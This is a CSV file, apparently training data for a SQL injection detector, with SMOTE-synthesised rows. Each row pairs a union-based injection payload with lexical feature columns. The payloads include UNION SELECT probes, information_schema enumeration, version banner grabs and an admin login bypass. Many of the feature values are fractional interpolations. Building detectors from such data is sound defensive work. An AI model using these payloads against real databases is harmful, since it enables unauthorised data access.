id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001637,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000008,0.18416559370351648,51.2875391442154,21.076677105124105,4.111190157945844,37.789137960908704,0.38338552562053607,8.05750782884308,5.057507828843081,0.7386570257059295,0.005808871600311127,0.15705067917922574,0.0984834235145336,0.019169276281026937,0.0,0.05750782884308059,0.0,0.9808307237189731,0.0,0.0,1.0,0.0,0.9808307237189733,1.0383385525620534,1.0383385525620534,0.019169276281026937,0.0,0.019169276281026826,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.9808307237189731,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9808307237189732,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9616614474379466
SMOTE_001638,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,2.244598488406872,90.78258259560454,26.92752753186818,4.0381920180989885,26.85505506373636,36.0,15.53623623406591,12.391291297802267,0.29541589467102103,0.39698102352009634,0.17150235336897093,0.1361007284399117,1.3912912978022678,0.5362362340659107,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.0,4.46376376593409,0.46376376593408913,0.5362362340659109,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.4637637659340892,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.463763765934089
SMOTE_001639,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.0490941642238234,52.547530198383996,20.309506039676798,3.9720205891022244,14.0,25.238024158707198,4.0,9.3095060396768,0.26692387157654907,0.4796913541081411,0.07626396330758543,0.17712081100772437,0.6904939603232004,0.3095060396767995,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.3095060396767995,3.0,0.6904939603232004,0.30950603967679974,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001640,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.7011538734539519,65.03718019824157,24.033056248363497,4.161446570471382,24.90495520478758,21.42148332896933,10.516528124181749,8.194213540302915,0.3853554076998325,0.32147182750580966,0.16788090912851983,0.12529185566583795,0.838842708060583,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.355370832242332,3.0,0.838842708060583,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001641,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,1.6912205670580909,106.63596166428273,27.11520511142897,3.6831354631424986,25.0,45.308769331426184,22.0,14.327192332856546,0.23557399638199406,0.4230816057888095,0.20730511681615477,0.13403928101304166,0.5576025557144847,0.4423974442855155,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,7.327192332856546,4.0,0.5576025557144846,0.4423974442855154,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001642,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.5968802583970877,103.40260844842842,28.0,3.9717772897888337,28.40260844842843,43.40260844842844,16.045435215250244,15.551956336321325,0.2745380416953973,0.4196304333563179,0.15554674381342296,0.15028478113486182,2.7013042242142156,0.0,3.0,0.0,0.0,1.0,0.0,1.149347887892892,0.0,0.0,6.850652112107108,4.850652112107108,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8506521121071078,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.850652112107108
SMOTE_001643,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,2.447402033037754,105.93305947966724,27.562993391148083,4.107347152839874,62.87401321770383,4.87401321770383,25.622039653111493,12.562993391148083,0.5941794436024043,0.045700151058745975,0.24112238796900068,0.11899801736984901,3.0,1.1259867822961687,2.0,0.0,1.0,2.437006608851916,0.0,0.0,0.0,0.0,1.0,6.0,1.0,0.5629933911480844,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.43700660885191567,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.437006608851915
SMOTE_001644,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.4507993110652258,94.87771407375695,30.633142221270845,4.321216527440494,36.02171259005558,28.97828740994442,16.755428147513896,13.122285926243052,0.37957304314963863,0.30552758229333987,0.1765783353594571,0.13832103919756436,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.244571852486105,5.877714073756947,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8777140737569477,2.0,1.0,1.0,0.8777140737569475,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.877714073756947
SMOTE_001645,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,1.4500441700511868,82.2661493666735,25.45064597466694,4.1570894792374515,27.0,33.0129194933388,11.0,11.2532298733347,0.33565345761440957,0.39224320704619875,0.13674770495401872,0.13535563038537296,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.253229873334698,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001646,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.6666116614701167,64.87385566846393,23.774771133692788,4.101380077729036,27.0,19.099084534771144,11.0,7.774771133692786,0.41847284621368597,0.2916329868218926,0.1704889373463165,0.11940522961810493,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.774771133692786,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001647,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,1.0945478022446395,108.08065553779767,28.0,4.1029876203408575,34.440874050396886,41.27956297480156,16.36021851259922,16.0,0.31796432610534475,0.3826508484017714,0.15124588218910437,0.1481389433037795,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.319890743700389,5.680109256299611,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.680109256299611,2.0,1.0,1.0,0.6801092562996109,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.680109256299611
SMOTE_001648,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.33861019250885016,74.8807939272919,28.119206072708096,4.278891528063729,29.0,20.0,15.0,10.880793927291904,0.38728954524478104,0.267096238099849,0.20032217857488677,0.14529203808048322,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,5.880793927291904,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8807939272919038,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001649,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,2.3826595660759584,60.592032166717026,22.398008041679255,4.078102846421686,20.234820908366068,24.0,7.35721125835096,9.0,0.32523817066905025,0.4070122143051067,0.115120034661428,0.152629580364415,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.47960160833585136,0.5203983916641487,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.4796016083358513,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001650,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.9296577242039555,57.999904714285485,23.49998213392853,4.163992062369524,23.749961290178476,16.99996426785706,10.249991066964265,6.9999880892856865,0.4097593662504775,0.28609605498790375,0.1838237337622554,0.12032084499936335,0.7499970223214214,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.249991066964264,3.0,0.7499970223214214,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001651,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.1710400749008172,75.0,31.34154286609536,4.376280037861405,41.53078574785759,4.96305710257089,16.67077143304768,11.83538571652384,0.5537438099714346,0.06617409470094518,0.22227695244063572,0.15780514288698452,0.49384285042848153,0.0,2.1646142834761606,0.0,1.670771433047679,1.0,0.0,0.16461428347616047,0.0,0.0,1.0,6.83538571652384,0.16461428347616047,0.0,1.0,0.0,0.0,1.0,0.16461428347616047,0.0,0.0,0.0,0.1646142834761605,2.0,1.0,1.0,0.8353857165238394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.83538571652384
SMOTE_001652,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.364555845442803,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,3.1222020346899475,0.8777979653100523,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.7805505086724869,0.21944949132751312,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001653,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.44624859964922303,69.20350712996013,24.550876782490032,4.193930946070087,25.832279634474084,24.0,10.371227495486046,9.0,0.3707807681686651,0.34993532971028907,0.14805815347968732,0.13122574864135841,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.9101753564980065,0.08982464350199346,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9101753564980064,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001654,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.1154370702648995,77.4144546082761,31.56084095620708,4.506086146372376,34.12168191241416,24.26806826034513,12.43915904379292,6.585545391723893,0.4403993897918643,0.31315799707207514,0.16099808560577522,0.08544452753028536,3.8536136520690265,0.0,0.43915904379292026,0.0,0.0,1.0,0.0,0.14638634793097338,0.0,0.0,1.0,1.5855453917238935,1.0,0.0,0.14638634793097338,0.0,0.0,1.0,0.14638634793097338,0.0,0.0,0.0,0.0,1.1463863479309733,1.0,0.14638634793097338,-5.551115123125783e-17,0.8536136520690267,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1463863479309735
SMOTE_001655,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.7528633941524023,104.85459786505636,29.029080426988727,4.208215161917447,37.0,35.88367829204509,17.0,14.970919573011273,0.3545818066021928,0.34000198062418235,0.16291596519560209,0.1425002475780228,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.9709195730112725,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001656,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,1.0698231317585123,54.46260177739145,22.836737833260894,4.120158078912431,22.31293197206527,15.673475666521792,9.918368916630449,6.557825222173931,0.4100549296643222,0.2786084485038366,0.1914098613842708,0.11992676044757035,0.6394563055434825,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.9183689166304483,3.0,0.6394563055434825,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001657,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.6336845851788633,63.65465192927904,24.061860771711615,4.152637996704929,27.0,18.12372154342323,11.0,7.530930385855807,0.4248197709660869,0.28392264860416105,0.17307472150470207,0.11818285892504993,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.5309303858558074,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001658,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.29558978029584365,59.42971953525611,22.811566344230734,4.032565734855285,26.183454158333177,15.74875512564098,10.560321469871711,6.937188781410245,0.4392478489100222,0.26675708110200447,0.17598027995189305,0.1180147900360802,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.9371887814102445,0.0628112185897554,0.0,1.9371887814102444,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9371887814102444,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001659,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,1.7446475484058002,85.05264794669961,28.0,4.225643609574143,29.0,28.46538774458914,15.0,12.587260202110464,0.3453153488717321,0.3282058328950629,0.17861138734744766,0.14786743088575732,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.116346936147285,5.470913265963179,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.47091326596317884,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001660,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.7693063447714455,73.61778567706078,25.153987392768283,4.170952711867974,26.69202521446344,25.847848713219374,11.769936963841406,9.307974785536564,0.3654695225586208,0.3489709350814848,0.15907008354434557,0.1264894588155488,0.8460126072317186,0.15398739276828127,3.0,0.0,0.0,0.15398739276828133,0.0,1.0,0.0,0.0,4.153987392768281,3.1539873927682813,0.8460126072317186,0.15398739276828138,1.0,0.0,0.0,0.15398739276828138,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.15398739276828127,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1539873927682813
SMOTE_001661,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,0.24991128395031587,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,3.83923588228926,0.16076411771074017,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.959808970572315,0.04019102942768504,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001662,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,1.462458626007673,94.39671335621807,29.19014006865423,4.246106218898722,32.17370684974461,32.82629315025538,15.793426712436153,13.603286643781923,0.34062975997151956,0.34797199051513494,0.16725995639705793,0.14413829311628754,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.206573287563846,5.3967133562180765,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3967133562180769,2.0,1.0,1.0,0.3967133562180769,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.396713356218077
SMOTE_001663,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000018,0.6066022720772133,62.07153754726552,20.392846245273446,3.7565833020821877,14.0,32.857230037812414,4.0,11.214307509453104,0.22700175171490336,0.527597897942116,0.06485764334711525,0.18054270699586544,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.214307509453104,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001664,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,2.779051462373005,73.00413711365839,29.355131413113266,4.38703756616815,32.649005700545125,22.355131413113266,11.706125712568141,6.293874287431859,0.44692678555369403,0.30340412408183587,0.16162844897360537,0.08804064139086479,0.2938742874318594,2.824502850272563,0.8816228622955777,0.0,0.0,0.7061257125681407,0.0,0.2938742874318593,0.0,0.0,1.2938742874318594,1.5877485748637183,0.2938742874318592,0.7061257125681408,0.2938742874318593,0.0,0.0,0.7061257125681407,0.2938742874318592,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.7061257125681408,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7061257125681406
SMOTE_001665,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,2.2048308844387043,59.87613533499355,22.219033833748387,4.068473721339539,19.769487967745803,24.0,7.10664736724774,9.0,0.32145208275756043,0.4117571808782532,0.11238179353484137,0.15440894282934495,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.4438067667496774,0.5561932332503227,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.44380676674967734,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001666,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000018,0.6555212801626342,63.230613922738094,20.55387721545238,3.7533567876134217,14.0,33.784491138190475,4.0,11.446122784547619,0.2217514667366286,0.5338982399160457,0.06335756192475103,0.1809927314225747,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.446122784547619,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001667,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.10008050160467125,61.58159411371363,23.116318822742727,4.0386563510903235,27.0,16.4652752909709,11.0,7.116318822742725,0.43899721979444284,0.26669967373119535,0.17885071917551376,0.11545238729884805,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.1163188227427256,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
